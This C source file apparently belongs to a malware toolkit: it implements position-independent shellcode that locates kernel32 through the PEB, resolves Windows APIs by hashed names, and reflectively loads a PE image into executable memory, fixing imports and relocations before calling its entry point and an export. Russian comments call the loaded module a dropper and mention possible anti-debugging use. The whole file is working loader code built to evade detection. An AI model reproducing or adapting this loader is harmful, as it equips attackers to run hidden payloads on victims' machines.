#ifndef _CONSOLE
#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>
//#include <intrin.h>

#define DLL_PROCESS_ATTACH   1
#define DLL_THREAD_ATTACH    2
#define DLL_THREAD_DETACH    3
#define DLL_PROCESS_DETACH   0

#else
#include <Windows.h>
#include <conio.h>

#endif // _CONSOLE

#include "../../../../shared/types.h"
#ifndef _CONSOLE
#include "../../../../shared/pe.h"
#else
#include "../../../../shared/native.h"
#include "../../../../shared/utils_cli.h"
#endif // _CONSOLE

#pragma intrinsic(_ReturnAddress)

typedef void* (*FnCreateFileW)(wchar_t* lpFileName, uint32_t dwDesiredAccess, uint32_t dwShareMode, void* lpSecurityAttributes, uint32_t dwCreationDisposition, uint32_t dwFlagsAndAttributes, void* hTemplateFile);
typedef int (*FnReadFile)(void* hFile, void* lpBuffer, uint32_t nNumberOfBytesToRead, uint32_t* lpNumberOfBytesRead, void* lpOverlapped);
typedef uint32_t (*FnGetFileSize)(void* hFile, uint32_t* lpFileSizeHigh);
typedef int (*FnDeleteFileW)(wchar_t* lpFileName);
typedef void* (*FnCloseHandle)(void* hHandle);
typedef void (*FnTerminateProcess)(void* hHandle, uint32_t uExitCode);
typedef void* (*FnVirtualAlloc)(void* lpAddress, size_t dwSize, uint32_t flAllocationType, uint32_t flProtect);
typedef int (*FnVirtualFree)(void* lpAddress, size_t dwSize, uint32_t dwFreeType);
typedef void* (*FnLoadLibraryA)(const char* lpFileName);
typedef void* (*FnGetProcAddress)(void* hModule, const char* lpProcName);
typedef VOID (*FnSleep)(DWORD dwMilliseconds);

#include "defines.h"

typedef struct _image_reloc
{
    uint16_t offset:12;
    uint16_t type:4;
} image_reloc_t, *pimage_reloc_t;

typedef int (*FnStdDllEP)(void* hModule, uint32_t ul_reason_for_call, void* pParams);
typedef int (*FnDllSpecialExport)(pvoid_t pParam);

#define KERNEL32_DLL_HASH 0xc4aa9d02

#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)
#define GET_DIRECTORY_PTR(pNtHdrs, idx)	&pNtHdrs->OptionalHeader.DataDirectory[idx]

#define FUNCS_COUNT 10

#define FN_CREATE_FILEW_HASH 0xD516DFB6
#define FN_CREATE_FILEW funcs[0]

#define FN_GET_FILE_SIZE_HASH 0x78DEF0B5
#define FN_GET_FILE_SIZE funcs[1]

#define FN_READ_FILE_HASH 0x565266A1
#define FN_READ_FILE funcs[2]

#define FN_CLOSE_HANDLE_HASH 0xD8368FC2
#define FN_CLOSE_HANDLE funcs[3]

#define FN_VIRTUAL_ALLOC_HASH 0x973F27BF
#define FN_VIRTUAL_ALLOC funcs[4]

#define FN_LOAD_LIBRARYA_HASH 0xFA5F1697
#define FN_LOAD_LIBRARYA funcs[5]

#define FN_GET_PROC_ADDRESS_HASH 0xE98905D0
#define FN_GET_PROC_ADDRESS funcs[6]

#define FN_VIRTUAL_FREE_HASH 0x785AFCB2
#define FN_VIRTUAL_FREE funcs[7]

#define FN_SLEEP_HASH 0x11D194A6
#define FN_SLEEP funcs[8]

#define FN_TERMINATE_PROCESS_HASH 0x2B173A8E
#define FN_TERMINATE_PROCESS funcs[9]

int shellcode_dllmem()
{
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs, newNtHdrs;
    FnStdDllEP fnStdDllEP = NULL;
    uint8_t* newBase = NULL;
    uintptr_t locationDelta;
    uint32_t i;
    PIMAGE_EXPORT_DIRECTORY pExports;
    PIMAGE_SECTION_HEADER pSection;
    uint16_t numberOfSections;
    PIMAGE_DATA_DIRECTORY pDirectory;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    uint8_t* moduleBase;
    uintptr_t* thunkRef;
    uintptr_t* funcRef;
    uintptr_t dwAddressArray;
    PIMAGE_DATA_DIRECTORY dwNameArray;
    PIMAGE_BASE_RELOCATION pReloc;
    int ret = 1;
    uint8_t* origBuffer = NULL;
    uint32_t origSize;
    pshellcode_data_t pShellcodeData;
    void* hFile = INVALID_HANDLE_VALUE;
    uint32_t counter;
    uint8_t* pParam;
    PLIST_ENTRY pDllListHead = NULL;
    PLIST_ENTRY pDllListEntry = NULL;
    uint8_t* pebBaseAddress;
    uint8_t* dllBase = NULL;
//     int kernel32Found = 0;
    PUNICODE_STRING dllName;
    pvoid_t funcs[FUNCS_COUNT];
    uint32_t hashes[FUNCS_COUNT];
    
    __stosb((uint8_t*)funcs, 0, sizeof(funcs));

/*    dllBase = (uint8_t*)_ReturnAddress();*/

    pShellcodeData = (pshellcode_data_t)((uint8_t*)_ReturnAddress() + 1);
    pParam = (uint8_t*)pShellcodeData + sizeof(shellcode_data_t) - 1 + pShellcodeData->dataSize;

    hashes[0] = FN_CREATE_FILEW_HASH;
    hashes[1] = FN_GET_FILE_SIZE_HASH;
    hashes[2] = FN_READ_FILE_HASH;
    hashes[3] = FN_CLOSE_HANDLE_HASH;
    hashes[4] = FN_VIRTUAL_ALLOC_HASH;
    hashes[5] = FN_LOAD_LIBRARYA_HASH;
    hashes[6] = FN_GET_PROC_ADDRESS_HASH;
    hashes[7] = FN_VIRTUAL_FREE_HASH;
    hashes[8] = FN_SLEEP_HASH;
    hashes[9] = FN_TERMINATE_PROCESS_HASH;
// 
//     if (pShellcodeData->ordinal == 1) {
//         *(uint16_t*)(&dllBase) &= 0xF000;
// 
//         while (dllBase >= (uint8_t*)0x0001000) {
//             if (*(uint16_t*)dllBase == 0x5A4D && *(uint16_t*)(*(PUINT32)(dllBase + 0x3C) + dllBase) == 0x4550) {
//                 break;
//             }
//             dllBase -= 4096;
//         }
// 
//         dosHdr = (PIMAGE_DOS_HEADER)dllBase;
//         ntHdrs = (PIMAGE_NT_HEADERS)(dllBase + dosHdr->e_lfanew);
// 
//         // Обрабатываем таблицу импорта.
//         pDirectory = GET_DIRECTORY_PTR(ntHdrs, IMAGE_DIRECTORY_ENTRY_IMPORT);
// 
//         if (pDirectory->VirtualAddress != 0) {
//             pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(dllBase + pDirectory->VirtualAddress);
//             for ( ; pImportDesc->Name; ++pImportDesc) {
//                 char* dllName = (char*)(dllBase + pImportDesc->Name);
// 
//                 if ((*(uint32_t*)(dllName) | 0x20202020) == 0x6e72656b && (*(uint32_t*)(dllName + 4) | 0x20202020) == 0x32336c65 && (*(uint32_t*)(dllName + 8) | 0x20202020) == 0x6c6c642e) {
//                     funcRef = (uintptr_t*)(dllBase + pImportDesc->FirstThunk);
// 
//                     dllBase = (uint8_t*)(*funcRef & 0xFFFFF000);
// 
//                     while (dllBase >= (uint8_t*)0x0001000) {
//                         if (*(uint16_t*)dllBase == 0x5A4D && *(uint16_t*)(*(PUINT32)(dllBase + 0x3C) + dllBase) == 0x4550) {
//                             kernel32Found = 1;
//                             break;
//                         }
//                         dllBase -= 4096;
//                     }
// 
//                     if (kernel32Found) {
//                         break;
//                     }
//                 }
//             }
//         }
// 
//         if (!kernel32Found) {
//             dllBase = NULL;
//         }
//     }
//     else {
#ifdef _WIN64
#define LDR_OFFSET 0x018
#define INMEMORYORDERMODULELIST_OFFSET 0x020
#define FULLDLLNAME_OFFSET 0x048
#define DLLBASE_OFFSET 0x020
    pebBaseAddress = (pvoid_t)__readgsqword(0x60);
#else
#define LDR_OFFSET 0x00C
#define INMEMORYORDERMODULELIST_OFFSET 0x014
#define FULLDLLNAME_OFFSET 0x024
#define DLLBASE_OFFSET 0x010
    pebBaseAddress = (pvoid_t)__readfsdword(0x30);
#endif

    pDllListEntry = pDllListHead = *(void**)(*(uint8_t**)(pebBaseAddress + LDR_OFFSET) + INMEMORYORDERMODULELIST_OFFSET);
    if (pDllListHead != NULL) {
        do {        
            dllName = (PUNICODE_STRING)((uint8_t*)pDllListEntry + FULLDLLNAME_OFFSET);

            if (dllName != NULL) {
                uint32_t hashVal = 0;
                uint16_t len = dllName->Length;
                uint8_t* ptr = (uint8_t*)dllName->Buffer;

                for ( ; len > 0; --len, ++ptr) {
                    hashVal = ((hashVal >> 11) | (hashVal << (32 - 11)));
                    hashVal += *ptr | 0x20;
                }

                if (hashVal == KERNEL32_DLL_HASH) {
                    dllBase = *(pvoid_t*)((uint8_t*)pDllListEntry + DLLBASE_OFFSET);
                    break;
                }
            }
            pDllListEntry = pDllListEntry->Flink;
        } while (pDllListEntry != pDllListHead);
    }
//     }

    if (dllBase != NULL) {
        uint32_t n, j;
        for (n = 0; n < FUNCS_COUNT; ++n) {
            PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)dllBase;
            PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(dllBase + dosHdr->e_lfanew);
            PIMAGE_EXPORT_DIRECTORY pExports;
            uint32_t NumberOfFuncNames;
            uint32_t* AddressOfNames;
            uint32_t* AddressOfFunctions;
            uint16_t index;

            pExports = (PIMAGE_EXPORT_DIRECTORY)(dllBase + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            NumberOfFuncNames = pExports->NumberOfNames;
            AddressOfNames = (uint32_t*)(dllBase + pExports->AddressOfNames);

            for (j = 0; j < NumberOfFuncNames; ++j) {
                char* pThunkRVAtemp = (char*)(dllBase + *AddressOfNames);
                if (pThunkRVAtemp != NULL) {
                    uint32_t cHashVal = 0;
                    uint8_t* ptr = (uint8_t*)pThunkRVAtemp;

                    for ( ; *ptr != '\0'; ++ptr) {
                        cHashVal = ((cHashVal >> 11) | (cHashVal << (32 - 11)));
                        cHashVal += *ptr;
                    }

                    if (cHashVal == hashes[n]) {
                        UINT16* AddressOfNameOrdinals = (uint16_t*)(dllBase + pExports->AddressOfNameOrdinals);
                        AddressOfNameOrdinals += (uint16_t)j;
                        index = *AddressOfNameOrdinals;
                        AddressOfFunctions = (uint32_t*)(dllBase +  pExports->AddressOfFunctions);
                        AddressOfFunctions += index;
                        funcs[n] = (pvoid_t)(dllBase + *AddressOfFunctions);
                        break;
                    }
                }
                AddressOfNames++;
            }

            if (funcs[n] == NULL) {
                return ret;
            }
        }

        do {
            if (pShellcodeData->dataSize > sizeof(pvoid_t)) {
                do {
                    for  (counter = 0; (hFile = ((FnCreateFileW)FN_CREATE_FILEW)((wchar_t*)pShellcodeData->data, GENERIC_READ, 0, 0, 3/*OPEN_EXISTING*/, 0, 0)) == INVALID_HANDLE_VALUE && counter < 7; ++counter) {
                        ((FnSleep)FN_SLEEP)(300);
                    }
                    if (hFile == INVALID_HANDLE_VALUE) {
                        break;
                    }

                    origSize = ((FnGetFileSize)FN_GET_FILE_SIZE)(hFile, NULL);

                    origBuffer = ((FnVirtualAlloc)FN_VIRTUAL_ALLOC)(0, origSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                    if (origBuffer == NULL) {
                        break;
                    }

                    if (!((FnReadFile)FN_READ_FILE)(hFile, origBuffer, origSize, &i, 0) || origSize != i) {
                        break;
                    }

                    ret = TRUE;
                } while (0);

                if (hFile != INVALID_HANDLE_VALUE) {
                    ((FnCloseHandle)FN_CLOSE_HANDLE)(hFile);
                }

                if (!ret) {
                    break;
                }
                ret = FALSE;
            }
            else {
                origBuffer = *(uint8_t**)pShellcodeData->data;
            }

            dosHdr = (PIMAGE_DOS_HEADER)origBuffer;
            ntHdrs = (PIMAGE_NT_HEADERS)(origBuffer + dosHdr->e_lfanew);

            // Устанавливаем флаги на всякий случай.
            ntHdrs->FileHeader.Characteristics = 0x2102;

            // Резервируем память для нашего образа
            newBase = (unsigned char*)((FnVirtualAlloc)FN_VIRTUAL_ALLOC)(NULL, ntHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (newBase == NULL) {
                break;
            }

            // Копируем PE-заголовок, включая MZ-заголовк со DOS-стабом.
            __movsb((unsigned char*)newBase, (unsigned char const*)origBuffer, (size_t)ntHdrs->OptionalHeader.SizeOfHeaders);
            newNtHdrs = (PIMAGE_NT_HEADERS)(newBase + dosHdr->e_lfanew);

            // Обновляем базу
            newNtHdrs->OptionalHeader.ImageBase = (uintptr_t)newBase;

            // Копируем все секции.
            pSection = IMAGE_FIRST_SECTION(newNtHdrs);
            numberOfSections = newNtHdrs->FileHeader.NumberOfSections;

            for (i = 0; i < numberOfSections; ++i, ++pSection) {
                __movsb(newBase + pSection->VirtualAddress, origBuffer + pSection->PointerToRawData, pSection->SizeOfRawData);
            }

            // Обрабатываем таблицу импорта.
            pDirectory = GET_DIRECTORY_PTR(newNtHdrs, IMAGE_DIRECTORY_ENTRY_IMPORT);

            if (pDirectory->VirtualAddress != 0) {
                pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(newBase + pDirectory->VirtualAddress);
                for ( ; pImportDesc->Name; ++pImportDesc) {
                    char* dllName = (char*)(newBase + pImportDesc->Name);

                    moduleBase = ((FnLoadLibraryA)FN_LOAD_LIBRARYA)(dllName);
                    if (moduleBase == NULL) {
                        goto exit;
                    }

                    if (pImportDesc->OriginalFirstThunk) {
                        thunkRef = (uintptr_t*)(newBase + pImportDesc->OriginalFirstThunk);
                        funcRef = (uintptr_t*)(newBase + pImportDesc->FirstThunk);
                    }
                    else {
                        // no hint table
                        thunkRef = (uintptr_t*)(newBase + pImportDesc->FirstThunk);
                        funcRef = (uintptr_t*)(newBase + pImportDesc->FirstThunk);
                    }
                    for ( ; *thunkRef; ++funcRef, ++thunkRef) {
                        if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
                            *funcRef = (uintptr_t)((FnGetProcAddress)FN_GET_PROC_ADDRESS)(moduleBase, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
                        }
                        else {                
                            PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(newBase + *thunkRef);
                            *funcRef = (uintptr_t)((FnGetProcAddress)FN_GET_PROC_ADDRESS)(moduleBase, thunkData->Name);
                        }
                        if (*funcRef == 0) {
                            goto exit;
                        }
                    }
                }
            }

            // Обрабатываем релоки.
            locationDelta = (newBase - (unsigned char*)ntHdrs->OptionalHeader.ImageBase);
            pDirectory = GET_DIRECTORY_PTR(newNtHdrs, IMAGE_DIRECTORY_ENTRY_BASERELOC);

            if (pDirectory->Size > 0) {
                pReloc = (PIMAGE_BASE_RELOCATION)(newBase + pDirectory->VirtualAddress);
                for ( ; pReloc->SizeOfBlock != 0; ) {
                    uint8_t* dest = newBase + pReloc->VirtualAddress;
                    image_reloc_t* relInfo = (image_reloc_t*)((uint8_t*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                    for (i = ((pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(image_reloc_t)); i > 0; --i, ++relInfo) {
#ifdef _WIN64
                        if (relInfo->type == IMAGE_REL_BASED_DIR64) {
                            *(uintptr_t*)(dest + relInfo->offset) += locationDelta;
                        }
                        else
#endif
                        if (relInfo->type == IMAGE_REL_BASED_HIGHLOW) {
                            *(uint32_t*)(dest + relInfo->offset) += (uint32_t)locationDelta;
                        }
                        else if (relInfo->type == IMAGE_REL_BASED_HIGH) {
                            *(uint16_t*)(dest + relInfo->offset) += HIWORD(locationDelta);
                        }
                        else if (relInfo->type == IMAGE_REL_BASED_LOW) {
                            *(uint16_t*)(dest + relInfo->offset) += LOWORD(locationDelta);
                        }
                    }

                    // Переходим к следующей таблице с релоками.
                    pReloc = (PIMAGE_BASE_RELOCATION)((uint8_t*)pReloc + pReloc->SizeOfBlock);
                }
            }

            // Передаём управление на точку входа.
            if (newNtHdrs->OptionalHeader.AddressOfEntryPoint == 0) {
                break;
            }

            fnStdDllEP = (FnStdDllEP)(newBase + newNtHdrs->OptionalHeader.AddressOfEntryPoint);

            ret = fnStdDllEP(newBase, DLL_PROCESS_ATTACH, pShellcodeData);

            // В случае с загрузкой самого дроппера, управление не достигнет здешних мест.
            if (ret) {
                uint32_t exportSize;
                uint32_t* addressOfFunctions;
                FnDllSpecialExport fnDllSpecialExport;

                // Функционал для вызовов экспортируемых функций. Возможно, в будущем их можно использовать для каких-то антиотладочных целей
                dosHdr = (PIMAGE_DOS_HEADER)newBase;
                ntHdrs = (PIMAGE_NT_HEADERS)(newBase + dosHdr->e_lfanew);
                // Ищем функцию с нулевым индексом (1 ординал).
                pExports = (PIMAGE_EXPORT_DIRECTORY)(newBase + ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                exportSize = ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

                // Должна быть таблица экспорта с ненулевым размером и иметь хотя бы один ординал.
                if (exportSize == 0 || pExports->NumberOfFunctions <= pShellcodeData->ordinal) {
                    break;
                }

                addressOfFunctions = (uint32_t*)(newBase +  pExports->AddressOfFunctions);

                // Смещения не должны быть нулевыми.
                if (addressOfFunctions[pShellcodeData->ordinal] == 0) {
                    break;
                }

                fnDllSpecialExport = (pvoid_t)(newBase + addressOfFunctions[pShellcodeData->ordinal]);

                // Проверяем является ли адрес форвардным.
                if (((uint8_t*)fnDllSpecialExport >= (uint8_t*)pExports) && ((uint8_t*)fnDllSpecialExport < ((uint8_t*)pExports + exportSize))) {
                    break;
                }

// #ifdef _WIN64
//                 __debugbreak();
// #else
//                 __asm int 3
// #endif // _WIN64

                ret = fnDllSpecialExport(pParam);
            }
        } while (0);
exit:

        if (origBuffer != NULL) {
            ((FnVirtualFree)FN_VIRTUAL_FREE)(origBuffer, 0, MEM_RELEASE);
        }

        if (newBase != NULL) {
            ((FnVirtualFree)FN_VIRTUAL_FREE)(newBase, 0, MEM_RELEASE);
        }
    }

    if (pShellcodeData->ordinal == 1) {
        ((FnTerminateProcess)FN_TERMINATE_PROCESS)(INVALID_HANDLE_VALUE, ret);
    }

    return ret;
}

#ifdef _CONSOLE


int __cdecl main(int argc, char** argv)
{
    shellcodeData.fnCreateFileW = (FnCreateFileW)CreateFileW;
    shellcodeData.fnReadFile = (FnReadFile)ReadFile;
    shellcodeData.fnGetFileSize = (FnGetFileSize)GetFileSize;
    shellcodeData.fnDeleteFileW = (FnDeleteFileW)DeleteFileW;
    shellcodeData.fnCloseHandle = (FnCloseHandle)CloseHandle;
    shellcodeData.fnExitProcess = (FnTerminateProcess)ExitProcess;
    shellcodeData.fnVirtualAlloc = (FnVirtualAlloc)VirtualAlloc;
    shellcodeData.fnVirtualFree = (FnVirtualFree)VirtualFree;
    shellcodeData.fnLoadLibraryA = (FnLoadLibraryA)LoadLibraryA;
    shellcodeData.fnGetProcAddress = (FnGetProcAddress)GetProcAddress;
    wcscpy_s(shellcodeData.modulePath, MAX_PATH, L"dpc.ex_");
    shellcode_dllmem();

    //_getch();

    return 0;
}

#endif // _CONSOLE
